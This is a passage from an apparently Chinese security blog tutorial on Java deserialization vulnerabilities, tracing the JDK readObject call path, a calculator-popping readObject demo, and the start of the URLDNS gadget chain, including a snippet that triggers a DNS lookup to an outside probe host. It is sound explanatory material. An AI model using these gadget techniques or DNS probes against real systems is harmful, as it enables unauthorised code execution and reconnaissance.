title="不可序列化的"></a>不可序列化的</h4><p>可以使用<code>transient</code>关键字来标记类的字段，告诉Java序列化机制不要将这些字段包含在序列化中。这在某些情况下很有用，比如一些涉及敏感信息的字段不希望被序列化。</p><p>除此之外，静态成员变量也是无法被序列化的，原因是因为序列化是针对对象及其实例变量的，而静态成员变量是类变量，属于类的状态，而非对象的状态。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">int</span> age; <span class="comment">// 不会被序列化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> staticField;  <span class="comment">// 不会被序列化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Externalizable接口"><a href="#Externalizable接口" class="headerlink" title="Externalizable接口"></a>Externalizable接口</h4><p>要使一个类可序列化，除了实现<code>Serializable</code>接口外，还可以实现<code>Externalizable</code>接口，该接口继承自<code>Serializable</code>。</p><p>在实现<code>Externalizable</code>接口时，必须实现一个类的无参构造器，还需实现<code>writeExternal</code>方法来定义对象的序列化方式，以及<code>readExternal</code>方法来定义对象的反序列化方式，这样可以更精确地控制对象的序列化和反序列化过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须实现一个无参构造器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现writeExternal和readExternal方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        name = (String) in.readObject();</span><br><span class="line">        age = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-Java反序列化漏洞的前世今生"><a href="#0x01-Java反序列化漏洞的前世今生" class="headerlink" title="0x01 Java反序列化漏洞的前世今生"></a>0x01 Java反序列化漏洞的前世今生</h2><h3 id="发展历史"><a href="#发展历史" class="headerlink" title="发展历史"></a>发展历史</h3><p>Java反序列化漏洞这一类型的漏洞利用，早在2011年就已在Spring中出现了第一个致使远程代码执行的Java反序列化利用，但在当时，反序列化这类问题并没有引起广泛的注意。</p><p>直至2015年1月加州AppSec安全会议上，Chris Frohoff和Gabe Lawrence发表《Marshalling Pickles》主题演讲，内容涵盖跨平台的反序列化漏洞、反序列化漏洞采取的多种形式以及可以找到反序列化漏洞的位置，除此之外，还包含了一些使用常用库中的类来攻击Java序列化的新颖技术，这些技术在随后也以Ysoserial工具的形式发布了。</p><p>再到2015年底才开始有其他研究人员使用这些技术和工具来利用Bamboo、WebLogic、WebSphere、ApacheMQ和Jenkins等知名产品，从那时起，Java反序列漏洞这一主题就被推到了公众视野中，并引起了广泛的关注。</p><h3 id="简单的反序列化利用：应用程序逻辑操纵"><a href="#简单的反序列化利用：应用程序逻辑操纵" class="headerlink" title="简单的反序列化利用：应用程序逻辑操纵"></a>简单的反序列化利用：应用程序逻辑操纵</h3><p>在《Marshalling Pickles》主题演讲中，Chris Frohoff和Gabe Lawrence演示了一个存在逻辑缺陷的网站，攻击者通过修改反序列化数据中的属性值，从而达到对管理员用户的未授权登录。如下是相关的序列化类代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qualcomm.isrm.appsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> userIsAdmin=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAdmin</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.userIsAdmin;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在逻辑缺陷的代码如下，如下代码片段对传入的Cookie值进行了反序列化转变为对象的操作（如下<code>readObject</code>方法），并获取了对象中的name，判断是否管理员name，是则进入到管理员用户页面。</p><p><img src="/img/post/java-deserialization-vulnerability-principle/appseccail-cookie.png"></p><p>攻击者只需抓包，修改Cookie中的序列化数据，将其中的name修改为管理员的name，即可达到恶意目的。</p><p><img src="/img/post/java-deserialization-vulnerability-principle/manipulated.png"></p><p>当然，在现代网站中，如上情景出现的概率不大，且这种反序列化逻辑操纵的危害也有限。</p><h3 id="反序列化危害升级：任意代码执行"><a href="#反序列化危害升级：任意代码执行" class="headerlink" title="反序列化危害升级：任意代码执行"></a>反序列化危害升级：任意代码执行</h3><p>那么，Chris Frohoff和Gabe Lawrence就继续在演讲中对反序列化的危害做出了升级的利用，即达到任意代码执行，他们在演讲中对这种利用方式又称之为Property-Oriented Programming或Object Injection，即面向属性编程或对象注入。</p><p>面向属性编程，简称POP，原本是一种编程范式，旨在通过属性的方式来描述程序的行为和结构。放在这里也这么称呼是由于在Java反序列化攻击中，攻击者可以控制反序列化对象的所有属性，这与二进制中的面向返回编程（ROP，Return-Oriented Programming）攻击类似，攻击者利用程序中已有的gadget代码片段，并通过构建一系列的gadget调用构造完整链，来实现特定的攻击目的，如执行恶意代码。</p><p>作者也在演讲中详细指出了关于构造完整gadget链的要点。首先，gadget类是需要从应用程序中寻找，其次是构成完整gadget链的三部分：</p><ul><li>以在反序列化过程中或之后执行的kick-off gadget开始。</li><li>以执行任意代码或命令的sink gadget结束。</li><li>使用其他gadget来启动gadget的执行直至结束gadget。</li></ul><p>当完整的gadget链构造成功后，将其序列化并发送至应用程序中存在漏洞的反序列化处，最后在反序列化时，gadget链就会在应用程序中执行。</p><p><img src="https://image.slidesharecdn.com/appseccali-150128135125-conversion-gate01/75/owasp-appseccali-2015-marshalling-pickles-45-2048.jpg"></p><h3 id="反序列化任意代码执行攻击的局限性"><a href="#反序列化任意代码执行攻击的局限性" class="headerlink" title="反序列化任意代码执行攻击的局限性"></a>反序列化任意代码执行攻击的局限性</h3><p>由于反序列化任意代码执行攻击的复杂性，也相应地带来了一定的局限性，在演讲中也指出了条件与注意事项。</p><ul><li>只能使用应用程序可用的类。</li><li>存在漏洞代码的ClassLoader与gadgets问题。</li><li>gadgets类必须实现Serializable&#x2F;Externalizable接口。</li><li>库或类版本的差异问题。</li><li>Static类型常量约束问题。</li></ul><p><img src="https://image.slidesharecdn.com/appseccali-150128135125-conversion-gate01/75/owasp-appseccali-2015-marshalling-pickles-71-2048.jpg"></p><h2 id="0x02-Java反序列化漏洞Kick-off-Gadget"><a href="#0x02-Java反序列化漏洞Kick-off-Gadget" class="headerlink" title="0x02 Java反序列化漏洞Kick-off Gadget"></a>0x02 Java反序列化漏洞Kick-off Gadget</h2><h3 id="重写readObject致使任意代码执行"><a href="#重写readObject致使任意代码执行" class="headerlink" title="重写readObject致使任意代码执行"></a>重写readObject致使任意代码执行</h3><p>反序列化漏洞利用的第一步就是利用某个重写了<code>readObject</code>方法的类，通常它也作为kick-off gadget。如下将演示一个类重写了<code>readObject</code>方法，并且其中存在恶意的行为，当这个类对象被序列化后，再被由<code>ObjectInputStream</code>读取对象进行反序列化时，恶意的行为便会被触发。</p><p>如下<code>User</code>类，实现了<code>Serializable</code>接口，在其中重写了<code>readObject</code>方法，且<code>readObject</code>方法中使用到了<code>Runtime.getRuntime().exec</code>方法来执行系统命令。</p><p><img src="/img/post/java-deserialization-vulnerability-principle/user-readObject.png"></p><p>当这个类被序列化后被保存至本地，在随后读取该文件，并对该类进行反序列化时，原本是调用<code>readObject</code>方法将存储在文件中的Java对象读入至内存中，并返回一个Object对象。但由于<code>User</code>类中存在一个重写的<code>readObject</code>方法，那么该方法就会被优先执行，最终系统命令被执行，即弹出一个计算器。</p><p><img src="/img/post/java-deserialization-vulnerability-principle/open-calc.png"></p><p>但在实际应用程序中，几乎不可能存在这么简单、直接的利用方式，原因很简单，几乎不可能有开发人员会在重写的readObject方法中编写恶意操作的代码，更具体地说，如上情况kiff-off入口类和sink危害类都是<code>User</code>类，且产生恶意行为就存在于readObject方法中，不太可能会有这么巧的事情。</p><p>通常更现实的情况是如下两种两种情况：</p><ol><li>重写了readObject方法的A类存在触发B类的危害点，从kiff-off直接到sink。</li><li>重写了readObject方法的A类作为kiff-off，但其中并不能直接触发到B类的危害点，需要不断地找两者之间的其他类方法作为中间调用链，直至到达B sink类。</li></ol><p>第二种情况更常见，寻找中间链也是极其复杂与繁琐的一个过程。</p><h3 id="readObject方法执行过程分析"><a href="#readObject方法执行过程分析" class="headerlink" title="readObject方法执行过程分析"></a>readObject方法执行过程分析</h3><p>如上演示了重写的<code>readObject()</code>方法在反序列化过程中会被执行，但究其原因，仅仅就近原则四个字可不够解释得通。如下将详细分析这个反序列化命令执行的过程，将断点打至该方法行以进行调试。</p><p><img src="/img/post/java-deserialization-vulnerability-principle/readObject-debug.png"></p><p>跟进其中，发现调用了重载方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">return</span> readObject(Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入这个重载方法中，在其中又调用了<code>readObject0</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">(Class&lt;?&gt; type)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! (type == Object.class || type == String.class))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;internal error&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if nested read, passHandle contains handle of enclosing object</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">outerHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readObject0(type, <span class="literal">false</span>);</span><br><span class="line">        handles.markDependency(outerHandle, passHandle);</span><br><span class="line">        <span class="type">ClassNotFoundException</span> <span class="variable">ex</span> <span class="operator">=</span> handles.lookupException(passHandle);</span><br><span class="line">        <span class="keyword">if</span> (ex != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            vlist.doCallbacks();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        passHandle = outerHandle;</span><br><span class="line">        <span class="keyword">if</span> (closed &amp;&amp; depth == <span class="number">0</span>) &#123;</span><br><span class="line">            clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readObject0</code>方法如下，该方法将读取从<code>ObjectOutputStream</code>写入的对象的字节表示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject0</span><span class="params">(Class&lt;?&gt; type, <span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line">    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">remain</span> <span class="operator">=</span> bin.currentBlockRemaining();</span><br><span class="line">        <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(remain);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span> tc;</span><br><span class="line">    <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">        bin.readByte();</span><br><span class="line">        handleReset();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    depth++;</span><br><span class="line">    totalObjectRefs++;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                <span class="keyword">return</span> readNull();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                <span class="keyword">if</span> (type == String.class) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>(<span class="string">&quot;Cannot cast an object to java.lang.String&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                    String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">        bin.setBlockDataMode(oldMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>TC_OBJECT</code>是Java序列化机制中用于标识对象开始的特殊标记之一，当读取到<code>(byte)0x73</code>时（即<code>TC_OBJECT</code>常量），意味着这是一个对象序列化数据的开始，那接下来便会调用<code>readOrdinaryObject</code>方法对对象做进一步处理。</p><p><img src="/img/post/java-deserialization-vulnerability-principle/readOrdinaryObject.png"></p><p>在<code>readOrdinaryObject</code>方法中，首先调用了<code>readClassDesc</code>方法用于读取对象序列化数据流中的类描述符，包括类名、序列化版本号、字段等等信息，如若类实现了<code>Externalizable</code>接口，便执行<code>readExternalData</code>方法，否则就执行<code>readSerialData</code>方法。</p><p><img src="/img/post/java-deserialization-vulnerability-principle/readSerialData.png"></p><p>继续进入到<code>readSerialData</code>方法，在其中通过了<code>hasReadObjectMethod</code>方法来判断对象是否有重写<code>readObject</code>方法，如果有重写，便调用<code>invokeReadObject</code>方法调用对象中的<code>readObject</code>方法。</p><p><img src="/img/post/java-deserialization-vulnerability-principle/invokeReadObject.png"></p><p>进入到<code>invokeReadObject</code>方法，成功弹出计算器。</p><p><img src="/img/post/java-deserialization-vulnerability-principle/rce.png"></p><h2 id="0x03-URLDNS链分析"><a href="#0x03-URLDNS链分析" class="headerlink" title="0x03 URLDNS链分析"></a>0x03 URLDNS链分析</h2><blockquote><p>在前面提到过，要成功执行反序列化攻击，需要有开头的Kick-off入口类（重写了readObject方法的类）、存在恶意行为的Sink类（执行恶意操作的结束类）以及中间Gadget链（用于将Kick-off与Sink连成一条完整链）。</p><p>如下以分析一个在实际现实中存在的Gadget链作为补充理解，理解URLDNS链对后续学习CommonsCollections6会有极大帮助，因为在CC6中也使用到了<code>HashMap</code>类作为Kick-off，也会涉及到<code>hashCode</code>方法。</p></blockquote><h3 id="Sink：URL-hashCode"><a href="#Sink：URL-hashCode" class="headerlink" title="Sink：URL#hashCode"></a>Sink：URL#hashCode</h3><p>Java中的<code>java.net.URL</code>类提供许多方法用于解析、构建和处理URL，包括获取URL的协议、主机、端口、路径等信息，以及打开连接、读取内容等操作，该类使Java程序可以很方便地与互联网上的资源进行交互和通信。</p><p><code>URL</code>类由<code>Serializable</code>实现，意味着该类可序列化，满足反序列化漏洞必备的条件之一。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">URL</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable</span><br></pre></td></tr></table></figure><p>在<code>URL</code>类中存在一个<code>hashCode</code>方法，该方法的作用是用于计算URL对象的哈希，但它还有一个奇怪的副作用，当调用该方法时，会对成员变量<code>hashCode</code>进行判断，如果该值不等于-1则直接返回该值，而成员变量<code>hashCode</code>的默认值就是-1，这也就意味着在正常情况下会调用<code>handler.hashCode</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用的<code>handler.hashCode</code>方法，即<code>java.net.URLStreamHandler#hashCode</code>，这个方法调用了<code>getProtocol</code>、<code>getHostAddress</code>等方法，根据这些方法名称，可以大致判断出这是在获取一个URL的几大部分，比如协议、主机名等信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>getHostAddress</code>方法中，又调用了<code>InetAddress.getByName</code>方法，这个方法会对提供的host进行解析从而获取它的IP地址，这样将会触发一个DNS查询。</p><p>那么这个DNS查询就是URLDNS链的所触发的恶意行为，虽然这个恶意行为的影响未必比得上远程代码执行，但作为反序列化漏洞的一个检测方式，还是很合适的，当然前提是服务器端的DNS流量能够出网。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写如下代码片段进行测试，可以发现，确实能够对指定的host触发DNS查询。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://urlhashcode.2acv23914hb.ipv6.bypass.eu.org&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-vulnerability-principle/urlhashcode.png"></p><p>作为补充说明的一点是，在<code>URL</code>类中，除了<code>hashCode</code>方法外，<code>equals</code>方法也能达到同样的恶意行为。</p><h3 id="Kick-off：HashMap-readObject"><a href="#Kick-off：HashMap-readObject" class="headerlink" title="Kick-off：HashMap#readObject"></a>Kick-off：HashMap#readObject</h3><p><code>java.util.HashMap</code>是Java中常用的集合类之一，它提供了一种快速的查找机制，可以根据键来快速查找对应的值，HashMap的常见操作包括插入元素、获取元素、删除元素、判断是否包含某个键等。</p><p>在<code>HashMap</code>类中有对<code>readObject</code>方法进行重写，重写后的<code>readObject</code>方法首先读取了<code>HashMap</code>的结构状态，然后为其包含的所有项开启一个循环，循环时从流中读取key和value。最后调用<code>putVal</code>方法，在其中通过<code>hash</code>方法获取key的哈希，还有key、value。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 